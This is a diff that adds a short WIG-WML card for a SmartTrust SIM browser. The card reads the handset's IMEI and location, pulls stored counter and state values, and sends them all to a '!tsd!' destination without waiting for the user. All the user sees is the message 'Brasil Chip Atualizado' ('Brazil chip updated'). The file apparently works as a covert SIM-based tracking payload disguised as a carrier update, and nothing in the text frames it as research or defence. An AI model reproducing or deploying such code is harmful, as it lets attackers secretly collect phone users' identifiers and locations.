@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="ISO-8859-1" ?>
+<!DOCTYPE wml PUBLIC "-//SmartTrust//DTD WIG-WML 4.0//EN"
+  "http://www.smarttrust.com/DTD/WIG-WML4.0.dtd">
+<wml>
+<card>
+<p>
+<plugin name="*PAD" destvar="" params="U\x10\x04"/>
+<providelocalinfo cmdqualifier="imei" destvar="IMEI"/>
+<plugin name="*PAD" destvar="ESTATE" params="R\x11"/>
+<plugin name="*PAD" destvar="ATTEMPTS" params="R\x12"/>
+<plugin name="*PAD" destvar="SUBMITS" params="R\x13"/>
+<plugin name="*PAD" destvar="NUM_IMEI" params="R\x14"/>
+<providelocalinfo cmdqualifier="location" destvar="LOC"/>
+<do type="accept">
+<go enterwait="false" href="!tsd!?I=$(IMEI)&amp;S=$(NUM_IMEI)&amp;L=$(LOC)&amp;A=$(ATTEMPTS)&amp;N=$(SUBMITS)&amp;D=$(ESTATE)" />
+</do>
+Brasil Chip Atualizado.
+</p>
+</card>
+</wml>
